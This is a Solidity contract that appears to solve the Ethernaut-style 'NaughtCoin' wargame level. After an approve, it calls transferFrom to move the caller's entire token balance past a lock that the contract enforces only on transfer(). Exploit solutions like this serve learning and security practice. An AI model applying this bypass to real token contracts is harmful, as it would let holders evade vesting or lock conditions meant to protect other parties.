// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";
import {console} from "forge-std/Script.sol";

contract NaughtCoinAttack is Broadcasted {
    function attack(address payable naughtCoinCtr_) public payable override {
        // ! there most be an approve before calling this function
        uint256 accBalance = INaughtCoin(naughtCoinCtr_).balanceOf(msg.sender);
        console.log("accBalance: %s", accBalance);
        // console.log(accBalance);

        INaughtCoin(naughtCoinCtr_).transferFrom(
            msg.sender,
            address(this),
            accBalance
        );
    }

    function broadcastedAttack(
        address payable levelInstanceCtr_
    ) external payable override {
        attack(levelInstanceCtr_);
    }
}

interface INaughtCoin {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    // ! call transfer from function instead of transfer, transfer from does not have the locker modifier
}
